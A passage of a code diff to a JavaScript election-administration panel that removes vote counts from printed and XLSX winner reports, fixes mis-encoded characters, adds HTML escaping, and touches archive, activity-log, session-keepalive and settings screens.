-                <th style="text-align:left;border-bottom:1px solid #ccc;padding:.4rem;">Votes</th>
+                <th>Position</th>
+                <th>Winner</th>
             </tr></thead>
             <tbody>
                 ${sec.positions.map(p => `
                     <tr>
-                        <td style="padding:.4rem;border-bottom:1px solid #eee;">${escapeHtml(p.title)}</td>
-                        <td style="padding:.4rem;border-bottom:1px solid #eee;">${p.winners.length ? p.winners.map(w => escapeHtml(w.name)).join(', ') : 'â€”'}${p.tie ? ' (TIE)' : ''}</td>
-                        <td style="padding:.4rem;border-bottom:1px solid #eee;">${p.winners.map(w => w.vote_count||0).join(', ')}</td>
+                        <td>${escapeHtml(p.title)}</td>
+                        <td>${p.winners.length ? p.winners.map(w => escapeHtml(w.name)).join(', ') : 'No candidates on this position'}${p.tie ? ' <strong>(TIE)</strong>' : ''}</td>
                     </tr>
                 `).join('')}
             </tbody>
@@ -3653,10 +3696,11 @@ function reportPrintableHTML(){
     return `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>${escapeHtml(title)}</title>
     <style>
         body{font-family:Georgia,'Times New Roman',serif;color:#0f172a;padding:2rem;max-width:800px;margin:0 auto;}
-        h1{font-size:1.4rem;margin-bottom:.2rem;}
-        .meta{color:#5b6b7f;font-size:.85rem;margin-bottom:1.5rem;}
-        /* When this tab is printed (or saved as PDF) the on-screen hint is
-           noise, and repeating it on every page helps nobody. */
+        h1{font-size:1.4rem;margin-bottom:1.5rem;}
+        h3{margin:1.5rem 0 .5rem;font-size:1rem;border-bottom:2px solid #0b2545;padding-bottom:.3rem;}
+        table{width:100%;border-collapse:collapse;margin-bottom:.5rem;}
+        th{text-align:left;border-bottom:1px solid #ccc;padding:.4rem;font-size:.85rem;}
+        td{padding:.4rem;border-bottom:1px solid #eee;}
         .print-hint{display:none;}
         @media print{
             body{padding:0;}
@@ -3667,14 +3711,13 @@ function reportPrintableHTML(){
     </style></head>
     <body>
         <h1>${escapeHtml(title)}</h1>
-        <div class="meta">Generated ${new Date().toLocaleString()}</div>
         <p class="print-hint" style="color:#94a3b8;font-size:.75rem;">Choose "Save as PDF" as the print destination; turn off headers and footers for a clean document.</p>
         ${sectionsHtml}
     </body></html>`;
 }
 
 // Opens the printable report in a new tab. `autoPrint` is what separates
-// "look at it" from "save it as a PDF" â€” a PDF is produced by the browser's
+// "look at it" from "save it as a PDF" — a PDF is produced by the browser's
 // own print pipeline, so the destination is the user's choice. This avoids a
 // third CDN library and keeps the printed output identical to the
 // preview, which a hand-rolled PDF generator would not.
@@ -3695,23 +3738,27 @@ function saveReportAsPDF(){
     openReportPrintPreview(true);
 }
 
+// XLSX export — matches the printable document exactly: Section, Position,
+// Winner, plus a note only where a tie needs resolving. No vote-count column,
+// so all four outputs (screen, print, PDF, XLSX, DOC) agree.
 function exportReportXLSX(){
     if (!lastReportData || typeof XLSX === 'undefined') { showToast('Export library failed to load. Please refresh and try again.', 'error'); return; }
     const { type, schoolYearLabel, sections } = lastReportData;
-    const rows = [['Section', 'Position', 'Winner(s)', 'Votes', 'Note']];
+    const rows = [['Section', 'Position', 'Winner', 'Note']];
     sections.forEach(sec => {
         sec.positions.forEach(p => {
             rows.push([
                 sec.heading,
                 p.title,
-                p.winners.length ? p.winners.map(w => w.name).join(', ') : 'â€”',
-                p.winners.map(w => w.vote_count||0).join(', '),
-                p.tie ? 'TIE â€” review needed' : '',
+                p.winners.length ? p.winners.map(w => w.name).join(', ') : 'No candidates on this position',
+                p.tie ? 'TIE — review needed' : '',
             ]);
         });
     });
     const ws = XLSX.utils.aoa_to_sheet(rows);
-    ws['!cols'] = [{wch:28},{wch:22},{wch:30},{wch:14},{wch:20}];
+    // Four columns now (Section, Position, Winner, Note) — the old widths
+    // were for a five-column sheet that included vote counts.
+    ws['!cols'] = [{wch:34},{wch:24},{wch:32},{wch:22}];
     const wb = XLSX.utils.book_new();
     XLSX.utils.book_append_sheet(wb, ws, `${type} Winners`);
     XLSX.writeFile(wb, `${type}_winners_${schoolYearLabel.replace(/[^a-z0-9]+/gi,'_')}.xlsx`);
@@ -3721,7 +3768,7 @@ function exportReportXLSX(){
 function exportReportDoc(){
     if (!lastReportData) return;
     const { schoolYearLabel } = lastReportData;
-    // A .doc file that's actually HTML â€” Word opens this natively (the
+    // A .doc file that's actually HTML — Word opens this natively (the
     // xmlns namespaces below are what make Word recognize it as a real
     // document rather than "unknown format"). Avoids needing a heavy
     // client-side docx-generation library for what's fundamentally a
@@ -3742,13 +3789,13 @@ function exportReportDoc(){
 }
 
 // ------------------------------------------------------------------
-// ARCHIVE PANEL â€” ended elections the admin has explicitly archived.
+// ARCHIVE PANEL — ended elections the admin has explicitly archived.
 // They're hidden from the main Elections list but not deleted, so
 // results/history are still there if needed; unarchiving just moves
 // them back to Ended.
 // ------------------------------------------------------------------
 let archiveSort = { field: 'end_date', dir: 'desc' };
-let electionDetailsCache = {}; // populated by renderResults(), keyed by election id â€” lets the CSV export button reference full detail without re-embedding it as inline JSON
+let electionDetailsCache = {}; // populated by renderResults(), keyed by election id — lets the CSV export button reference full detail without re-embedding it as inline JSON
 
 function sortArchived(list){
     const dir = archiveSort.dir === 'asc' ? 1 : -1;
@@ -3784,7 +3831,7 @@ async function renderArchive(){
                     <option value="target_school_year" ${archiveSort.field==='target_school_year'?'selected':''}>Sort by: Election School Year</option>
                 </select>
                 <button class="btn btn-secondary btn-sm" onclick="archiveSort.dir = archiveSort.dir==='asc'?'desc':'asc'; renderArchive();">
-                    ${archiveSort.dir === 'asc' ? 'â†‘ Ascending' : 'â†“ Descending'}
+                    ${archiveSort.dir === 'asc' ? '↑ Ascending' : '↓ Descending'}
                 </button>
             </div>
         `;
@@ -3792,7 +3839,7 @@ async function renderArchive(){
         if (!archived.length) {
             document.getElementById('panel-archive').innerHTML = `
                 ${sortBar}
-                <div class="coming-soon"><div class="cs-icon">ðŸ—„</div><h3>Nothing archived yet</h3><p>Ended elections show up here once you archive them from the Elections tab.</p></div>
+                <div class="coming-soon"><div class="cs-icon">🗄</div><h3>Nothing archived yet</h3><p>Ended elections show up here once you archive them from the Elections tab.</p></div>
             `;
             return;
         }
@@ -3802,11 +3849,11 @@ async function renderArchive(){
                 <div class="card-top-row">
                     <span class="status-large closed"><span class="status-dot"></span>Archived</span>
                     ${syBadgeHtml(e.target_school_year_label)}
-                    <div class="remaining-time">${fmtDateTime(e.start_date)} â€“ ${fmtDateTime(e.end_date)}</div>
+                    <div class="remaining-time">${fmtDateTime(e.start_date)} – ${fmtDateTime(e.end_date)}</div>
                 </div>
                 <div>
                     <h2 class="election-title">${escapeHtml(e.name)}</h2>
-                    <div class="election-sub">${e.type === 'SSG' ? 'Supreme Student Government' : 'Department Student Government â€” ' + escapeHtml(e.department || '')}</div>
+                    <div class="election-sub">${e.type === 'SSG' ? 'Supreme Student Government' : 'Department Student Government — ' + escapeHtml(e.department || '')}</div>
                 </div>
                 <div class="card-actions">
                     <button class="btn btn-secondary" onclick="viewElectionResults(${e.id})">View Results</button>
@@ -3839,7 +3886,7 @@ function logTimeOnly(createdAt){
 }
 async function renderLogs(){
     // Mimics the actual shape (day header + a few log rows, repeated)
-    // instead of a plain "Loadingâ€¦" line, matching every other panel.
+    // instead of a plain "Loading…" line, matching every other panel.
     document.getElementById('panel-logs').innerHTML = `
         <div class="logs-full" style="padding:1.25rem 1.5rem;">
             ${'<div class="skeleton skel-line w40" style="height:11px;margin:0 0 1rem;"></div>' + '<div class="skeleton skel-line" style="height:17px;"></div>'.repeat(3)}
@@ -3861,11 +3908,11 @@ async function renderLogs(){
                 html += `<div class="log-day-header">${escapeHtml(dayLabel)}</div>`;
                 currentDay = dayLabel;
             }
-            html += `<div class="log-item"><span class="log-dot"></span><span class="log-time">${escapeHtml(logTimeOnly(l.created_at))}</span><span class="log-text">${l.admin_username ? `<strong>${escapeHtml(l.admin_username)}</strong> â€” ` : ''}${escapeHtml(l.action)}</span></div>`;
+            html += `<div class="log-item"><span class="log-dot"></span><span class="log-time">${escapeHtml(logTimeOnly(l.created_at))}</span><span class="log-text">${l.admin_username ? `<strong>${escapeHtml(l.admin_username)}</strong> — ` : ''}${escapeHtml(l.action)}</span></div>`;
         });
 
         document.getElementById('panel-logs').innerHTML = `
-            <div class="logs-full">${html || '<div class="coming-soon"><div class="cs-icon">ðŸ“œ</div><h3>No activity yet</h3><p>Actions admins take will show up here.</p></div>'}</div>
+            <div class="logs-full">${html || '<div class="coming-soon"><div class="cs-icon">📜</div><h3>No activity yet</h3><p>Actions admins take will show up here.</p></div>'}</div>
         `;
     } catch (e) {
         document.getElementById('panel-logs').innerHTML = '<div class="alert alert-error">Could not load activity logs.</div>';
@@ -3874,7 +3921,7 @@ async function renderLogs(){
 
 // ------------------------------------------------------------------
 // SESSION KEEPALIVE / IDLE WARNING
-// Best-effort only â€” there's no server endpoint that reports the actual
+// Best-effort only — there's no server endpoint that reports the actual
 // PHP session TTL, so this can't guarantee anything. What it does:
 //   1) While the election wizard has unsaved changes, silently pings a
 //      session-protected GET every 5 minutes so a long edit session
@@ -3893,7 +3940,7 @@ let lastActivityAt = Date.now();
 
 let idleBannerEl = null;
 function keepSessionAlive(){
-    // A harmless, already-authenticated GET â€” just enough to touch the
+    // A harmless, already-authenticated GET — just enough to touch the
     // session on the server so it doesn't expire mid-edit.
     fetch(ELECTIONS_API, { method: 'GET' }).catch(() => {});
     lastActivityAt = Date.now();
@@ -3910,7 +3957,7 @@ function showIdleBanner(){
     idleBannerEl = document.createElement('div');
     idleBannerEl.className = 'idle-banner';
     idleBannerEl.innerHTML = `
-        <span>You've been idle a while â€” your session may expire soon.</span>
+        <span>You've been idle a while — your session may expire soon.</span>
         <button type="button" class="btn btn-primary btn-sm">Stay signed in</button>
     `;
     idleBannerEl.querySelector('button').addEventListener('click', () => {
@@ -3929,7 +3976,7 @@ setInterval(() => {
     if (wizardIsDirty() && Date.now() - lastKeepaliveAt > WIZARD_KEEPALIVE_MS) {
         lastKeepaliveAt = Date.now();
         keepSessionAlive();
-        return; // actively editing counts as activity â€” no need to also nag with the idle banner
+        return; // actively editing counts as activity — no need to also nag with the idle banner
     }
     if (Date.now() - lastActivityAt > IDLE_WARNING_MS) {
         showIdleBanner();
@@ -3939,14 +3986,14 @@ setInterval(() => {
 }, 60 * 1000);
 
 // ------------------------------------------------------------------
-// SETTINGS PANEL â€” manage Faculty / School Year / Year Level, which used
+// SETTINGS PANEL — manage Faculty / School Year / Year Level, which used
 // to be hardcoded arrays in this file. All follow the same shape: text
-// fields update immediately in memory (oninput, no re-render â€” same fix
+// fields update immediately in memory (oninput, no re-render — same fix
 // as the earlier student-form bug where a re-render on every keystroke
 // wiped out other fields), and an explicit Save/Delete/reorder click is
 // what actually talks to the server. Renaming a faculty's CODE (the
 // value actually stored on students/elections) goes through a confirm
-// modal since it bulk-updates existing records â€” plain display-name-only
+// modal since it bulk-updates existing records — plain display-name-only
 // edits and year-level renames don't need that same warning weight but
 // still bulk-update transparently server-side (see api/settings.php).
 // ------------------------------------------------------------------
@@ -3966,11 +4013,11 @@ function renderSettingsContent(){
             <div class="election-logo-badge">${electionLogoHtml('DSG', d.code)}</div>
             <input type="file" id="dept_logo_input_${i}" accept="image/*" style="display:none;" onchange="handleDeptLogoUpload(event, '${escapeHtml(d.code)}')">
             <button class="btn btn-secondary btn-sm" onclick="document.getElementById('dept_logo_input_${i}').click()" title="Upload a logo for this faculty">Logo</button>
-            ${d.logo ? `<button class="btn btn-danger btn-sm" onclick="clearDeptLogo('${escapeHtml(d.code)}')" title="Remove this faculty's logo">âœ•</button>` : ''}
+            ${d.logo ? `<button class="btn btn-danger btn-sm" onclick="clearDeptLogo('${escapeHtml(d.code)}')" title="Remove this faculty's logo">✕</button>` : ''}
             <input type="text" class="name-field" id="dept_name_${i}" value="${escapeHtml(d.name)}" maxlength="150" placeholder="Faculty name">
             <div class="reorder-btns">
-                <button class="btn btn-secondary btn-sm" ${i===0?'disabled':''} onclick="moveDepartment(${i},-1)" title="Move up">â†‘</button>
-                <button class="btn btn-secondary btn-sm" ${i===settingsData.departments.length-1?'disabled':''} onclick="moveDepartment(${i},1)" title="Move down">â†“</button>
+                <button class="btn btn-secondary btn-sm" ${i===0?'disabled':''} onclick="moveDepartment(${i},-1)" title="Move up">↑</button>
+                <button class="btn btn-secondary btn-sm" ${i===settingsData.departments.length-1?'disabled':''} onclick="moveDepartment(${i},1)" title="Move down">↓</button>
             </div>
             <button class="btn btn-secondary btn-sm" onclick="saveDepartmentRow(${i})">Save</button>
             <button class="btn btn-danger btn-sm" onclick="deleteDepartmentRow(${i})">Delete</button>
@@ -3985,8 +4032,8 @@ function renderSettingsContent(){
             <input type="text" class="code-field" id="sy_label_${i}" value="${escapeHtml(sy.label)}" maxlength="20" placeholder="Label (e.g. 2025-2026)">
             <input type="text" class="code-field" id="sy_start_${i}" value="${escapeHtml(String(sy.start_year))}" maxlength="4" placeholder="Start year" style="width:100px;">
             <div class="reorder-btns">
-                <button class="btn btn-secondary btn-sm" ${i===0?'disabled':''} onclick="moveSchoolYear(${i},-1)" title="Move up">â†‘</button>
-                <button class="btn btn-secondary btn-sm" ${i===(settingsData.school_years||[]).length-1?'disabled':''} onclick="moveSchoolYear(${i},1)" title="Move down">â†“</button>
+                <button class="btn btn-secondary btn-sm" ${i===0?'disabled':''} onclick="moveSchoolYear(${i},-1)" title="Move up">↑</button>
+                <button class="btn btn-secondary btn-sm" ${i===(settingsData.school_years||[]).length-1?'disabled':''} onclick="moveSchoolYear(${i},1)" title="Move down">↓</button>
             </div>
             <button class="btn btn-secondary btn-sm" onclick="saveSchoolYearRow(${i})">Save</button>
             <button class="btn btn-danger btn-sm" onclick="deleteSchoolYearRow(${i})">Delete</button>
@@ -3997,8 +4044,8 @@ function renderSettingsContent(){
         <div class="settings-row">
             <input type="text" class="name-field" id="year_name_${i}" value="${escapeHtml(y.name)}" maxlength="20" placeholder="Year level name" style="max-width:220px;">
             <div class="reorder-btns">
-                <button class="btn btn-secondary btn-sm" ${i===0?'disabled':''} onclick="moveYearLevel(${i},-1)" title="Move up">â†‘</button>
-                <button class="btn btn-secondary btn-sm" ${i===settingsData.year_levels.length-1?'disabled':''} onclick="moveYearLevel(${i},1)" title="Move down">â†“</button>
+                <button class="btn btn-secondary btn-sm" ${i===0?'disabled':''} onclick="moveYearLevel(${i},-1)" title="Move up">↑</button>
+                <button class="btn btn-secondary btn-sm" ${i===settingsData.year_levels.length-1?'disabled':''} onclick="moveYearLevel(${i},1)" title="Move down">↓</button>
             </div>
             <button class="btn btn-secondary btn-sm" onclick="saveYearLevelRow(${i})">Save</button>
             <button class="btn btn-danger btn-sm" onclick="deleteYearLevelRow(${i})">Delete</button>
@@ -4021,8 +4068,8 @@ function renderSettingsContent(){
 
         <div class="card" style="margin-bottom:1.5rem;">
             <h2 class="section-title">Faculties</h2>
-            <p class="muted" style="margin:-0.5rem 0 1rem;font-size:.82rem;">Used for DSG elections and student records. Enter the complete faculty name â€” renaming updates every existing student and election that uses it.</p>
-            ${deptRows || '<p class="settings-empty">No faculties yet â€” add one below.</p>'}
+            <p class="muted" style="margin:-0.5rem 0 1rem;font-size:.82rem;">Used for DSG elections and student records. Enter the complete faculty name — renaming updates every existing student and election that uses it.</p>
+            ${deptRows || '<p class="settings-empty">No faculties yet — add one below.</p>'}
             <div class="settings-add-row">
                 <input type="text" id="newDeptName" placeholder="Faculty name (e.g. Faculty of Information and Communications Technology)" maxlength="150" style="flex:1;min-width:260px;">
                 <button class="btn btn-primary btn-sm" onclick="createDepartment()">+ Add Faculty</button>
@@ -4031,8 +4078,8 @@ function renderSettingsContent(){
 
         <div class="card" style="margin-bottom:1.5rem;">
             <h2 class="section-title">School Years</h2>
-            <p class="muted" style="margin:-0.5rem 0 1rem;font-size:.82rem;">This list is maintained automatically from today's date â€” the school year marked "Current" isn't something you set manually. Every student's Year Level, and which students are past 4 years, is computed against it. You can still rename a label or fix a start year below if something looks wrong.</p>
-            ${schoolYearRows || '<p class="settings-empty">No school years yet â€” add one below.</p>'}
+            <p class="muted" style="margin:-0.5rem 0 1rem;font-size:.82rem;">This list is maintained automatically from today's date — the school year marked "Current" isn't something you set manually. Every student's Year Level, and which students are past 4 years, is computed against it. You can still rename a label or fix a start year below if something looks wrong.</p>
+            ${schoolYearRows || '<p class="settings-empty">No school years yet — add one below.</p>'}
             <div class="settings-add-row">
                 <input type="text" id="newSchoolYearLabel" placeholder="Label (e.g. 2025-2026)" maxlength="20">
                 <input type="text" id="newSchoolYearStart" placeholder="Start year (e.g. 2025)" maxlength="4" style="max-width:160px;">
@@ -4042,7 +4089,7 @@ function renderSettingsContent(){
 
         <div class="card">
             <h2 class="section-title">Year Levels</h2>
-            ${yearRows || '<p class="settings-empty">No year levels yet â€” add one below.</p>'}
+            ${yearRows || '<p class="settings-empty">No year levels yet — add one below.</p>'}
             <div class="settings-add-row">
                 <input type="text" id="newYearName" placeholder="e.g. 1st Year" maxlength="20" style="max-width:220px;">
                 <button class="btn btn-primary btn-sm" onclick="createYearLevel()">+ Add Year Level</button>
@@ -4101,10 +4148,10 @@ async function saveDepartmentRow(i){
                 const parts = [];
                 if (data.updated_students) parts.push(`${data.updated_students} student${data.updated_students===1?'':'s'}`);
                 if (data.updated_elections) parts.push(`${data.updated_elections} election${data.updated_elections===1?'':'s'}`);
-                msg = parts.length ? `Renamed â€” updated ${parts.join(' and ')}.` : 'Renamed.';
-                allStudentsCache = null; // faculty values changed â€” invalidate so the Students table reflects it
+                msg = parts.length ? `Renamed — updated ${parts.join(' and ')}.` : 'Renamed.';
+                allStudentsCache = null; // faculty values changed — invalidate so the Students table reflects it
             }
-            addLog(`Updated faculty "${d.name}"${nameChanged ? ` â†’ renamed to "${newName}"` : ''}`);
+            addLog(`Updated faculty "${d.name}"${nameChanged ? ` → renamed to "${newName}"` : ''}`);
             showToast(msg, 'success');
             await loadSettingsData(true);
             renderSettingsContent();
@@ -4118,7 +4165,7 @@ async function deleteDepartmentRow(i){
     const d = settingsData.departments[i];
     const confirmed = await showConfirmModal({
         title: 'Delete this faculty?',
-        message: `"${d.code}" will be permanently removed. This is blocked if any student or election is still using it.`,
+        message: `"${escapeHtml(d.code)}" will be permanently removed. This is blocked if any student or election is still using it.`,
         confirmLabel: 'Delete Faculty',
     });
     if (!confirmed) return;
@@ -4130,7 +4177,7 @@ async function deleteDepartmentRow(i){
         });
         const data = await res.json();
         if (res.ok && data.success) {
-            addLog(`Deleted faculty "${d.code}"`);
+            addLog(`Deleted faculty "${escapeHtml(d.code)}"`);
             showToast('Faculty deleted.', 'success');
             await loadSettingsData(true);
             renderSettingsContent();
@@ -4368,10 +4415,10 @@ async function saveYearLevelRow(i){
                 const parts = [];
                 if (data.updated_students) parts.push(`${data.updated_students} student${data.updated_students===1?'':'s'}`);
                 if (data.updated_positions) parts.push(`${data.updated_positions} position${data.updated_positions===1?'':'s'}`);
-                msg = parts.length ? `Renamed â€” updated ${parts.join(' and ')}.` : 'Renamed.';
+                msg = parts.length ? `Renamed — updated ${parts.join(' and ')}.` : 'Renamed.';
                 if (data.updated_students) allStudentsCache = null;
             }
-            addLog(`Updated year level "${y.name}"${renamed ? ` â†’ renamed to "${newName}"` : ''}`);
+            addLog(`Updated year level "${y.name}"${renamed ? ` → renamed to "${newName}"` : ''}`);
             showToast(msg, 'success');
             await loadSettingsData(true);
             renderSettingsContent();
